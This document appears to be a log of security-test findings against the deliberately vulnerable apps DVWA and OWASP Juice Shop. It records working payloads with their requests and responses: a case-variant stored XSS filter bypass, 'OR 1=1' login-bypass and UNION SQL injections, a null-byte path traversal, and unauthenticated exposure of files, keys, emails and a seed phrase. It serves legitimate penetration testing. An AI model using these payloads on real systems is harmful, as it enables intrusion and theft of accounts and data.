findings.title: Stored XSS in DVWA guestbook (case-variant/<SCRIPT> bypass) at security=medium
request_sequence: POST /security.php (session=dvwa_admin) form_data: security=medium, seclev_submit=Submit, user_token=[REDACTED] token> -> sets server-side DVWA security level to medium (footer confirms 'Security Level: medium')

POST /vulnerabilities/xss_s/ (session=dvwa_admin) form_data: txtName=canary, mtxMessage=<SCRIPT id="test_token">window.xss_flag=1</SCRIPT>, btnSign=Sign Guestbook -> medium filter runs case-sensitive str_replace('<script>') which does not strip the uppercase <SCRIPT> tag, so the payload is stored ve
browser_navigate (session=dvwa_admin) http://dvwa/vulnerabilities/xss_s/ -> renders stored guestbook entry containing the <SCRIPT id="test_token"> block
browser_eval_js("window.xss_flag") -> returned 1, proving stored script executed in authenticated browser context
findings.response_evidence: [security=medium] Footer of the rendering page shows "Security Level: medium". The stored guestbook entry rendered the injected script content <SCRIPT id="test_token">window.xss_flag=1</SCRIPT> because the medium-level filter's case-sensitive str_replace('<script>') failed to strip the uppercase/case-variant <SCRIPT> tag. In the authenticated dvwa_admin browser context, browser_eval_js("window.xss_flag") returned 1, confirming client-side JavaScript execution from the stored payload. This is a distinct instance from the low-level finding (requires the case-variant <SCRIPT> bypass to defeat the medium filter).
findings.browser_js_evidence: browser_eval_js("window.xss_flag") === 1 (stored <SCRIPT id="test_token"> payload executed in authenticated dvwa_admin browser context at security=medium)

findings.title: Login Authentication-Bypass SQL Injection on /rest/user/login
findings.response_evidence: HTTP 200. Injecting email=' OR 1=1-- with arbitrary password returned a valid authentication token and resolved to the FIRST user: response JSON {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The SQLi comment (--) truncates the WHERE clause, so the OR 1=1 tautology matches all rows and authenticates as admin@juice-sh.op (UserId=1) without valid credentials.

findings.title: Product-Search SQL Injection (SQLITE_ERROR + 9-column UNION) on /rest/products/search
findings.response_evidence: Step 1 (q=qwert'): HTTP 500 with body 'Error: SQLITE_ERROR: near \"'%'\": syntax error' (Express ^4.17.1), proving the input breaks out of the SQL string context. Step 2 (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--): HTTP 200 success with injected UNION row reflected back verbatim: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. The attacker-controlled constants (2..9) appear mapped into result columns, confirming a working 9-column UNION injection.

findings.title: Unauthenticated User-Feedback PII Exposure on /api/Feedbacks
request_sequence: GET http://juiceshop:3000/api/Feedbacks (no Authorization header, unauth session)
findings.response_evidence: HTTP 200 WITHOUT authentication. Endpoint returns 8 feedback records disclosing UserId linkage plus author email addresses embedded in the comment field. Exposed emails (partially masked but domain-complete, tied to UserIds): record id=1 UserId=1 comment '...Highly recommended! (***in@juice-sh.op)', id=2 UserId=2 '...Awesome service! (***@juice-sh.op)', id=3 UserId=3 '...Nothing useful available here! (***der@juice-sh.op)', id=4 UserId=21 '...(***ereum@juice-sh.op)'. Also record id=4 leaks a crypto wallet seed phrase: 'purpose betray marriage blame crunch monitor spin slide donate sport lift clutch'. PII (author email addresses + UserId mapping) is disclosed to any unauthenticated caller.

findings.response_evidence:
Unauthenticated GET /ftp/ returned a browsable directory listing containing acquisitions.md among other files. Unauthenticated GET /ftp/acquisitions.md returned HTTP 200 (text/markdown) with the confidential memo: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year..." ending "Our shareholders will be excited. It's true. No fake news." Confidential document disclosed without authentication.

findings.title: Poison Null-Byte Path Traversal bypassing extension filter (/ftp/package.json.bak)
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (session=unauth) -> HTTP 403 'Only .md and .pdf files are allowed!'
GET http://juiceshop:3000/ftp/package.json.bak%2500.md (session=unauth) -> HTTP 200 with backup file content
findings.response_evidence: Raw path GET /ftp/package.json.bak returned HTTP 403 with body "Error: Only .md and .pdf files are allowed!" (fileServer.js:55 verify). Appending the URL-encoded null byte + allowed extension, GET /ftp/package.json.bak%2500.md, returned HTTP 200 (application/octet-stream) with the restricted backup contents: {"name":"juice-shop","version":"6.2.0-SNAPSHOT","description":"An intentionally insecure JavaScript Web Application"...} including full dependency list. Poison null-byte bypass of the extension whitelist confirmed.

findings.title: Exposed Encryption-Keys Directory via Browsable Directory Listing
findings.response_evidence: HTTP 200, Content-Type text/html; charset=utf-8. Unauthenticated serve-index directory listing rendered: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Both sensitive key files are exposed and directly linked: /encryptionkeys/jwt.pub (248 bytes, JWT public key) and /encryptionkeys/premium.key (50 bytes, premium content HMAC key). Directory is browsable without authentication, disclosing the full key file inventory.

findings.title: Open /ftp Directory Listing Exposing Sensitive File Inventory
findings.response_evidence: HTTP 200, Content-Type text/html; charset=utf-8. Unauthenticated serve-index directory listing rendered: "listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 ... announcement_encrypted.md 369237 ... coupons_2013.md.bak 131 ... eastere.gg 324 ... encrypt.pyc 573 ... incident-support.kdbx 3246 ... legal.md 3047 ... package.json.bak 4291 ... suspicious_errors.yml 723". The browsable listing enumerates the full /ftp/ file inventory including confidential/backup artifacts (acquisitions.md, coupons_2013.md.bak, package.json.bak, incident-support.kdbx KeePass DB, encrypt.pyc). This is a distinct directory-enumeration (CWE-548/CWE-200) weakness separate from the already-confirmed acquisitions.md content-disclosure finding: here the vulnerability is the directory listing itself exposing the presence and names of backup/confidential files (quarantine subdir, .bak files, .kdbx password database) that enable targeted retrieval and traversal attacks.
